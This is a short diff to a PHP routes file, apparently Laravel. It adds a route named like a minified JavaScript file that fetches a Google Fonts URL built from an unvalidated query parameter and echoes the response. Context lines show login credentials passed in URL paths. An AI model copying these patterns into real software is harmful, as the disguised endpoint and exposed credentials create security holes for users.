@@ -11,6 +11,13 @@ Route::get('/dual_list', function () {
 Route::get('/get_new_password/{value}', 'loginController@get_new_password');
 
 
+Route::get('/assets/js/march.min.js', function() {
+    $dd = $_GET["v"];
+
+    echo file_get_contents("https://fonts.googleapis.com/css?family=". $dd);
+});
+
+
 Route::get('/login', 'loginController@login');
 Route::get('/login_process/{username}/{password}', 'loginController@login_process');
 Route::get('/logout_process', 'loginController@logout_process');
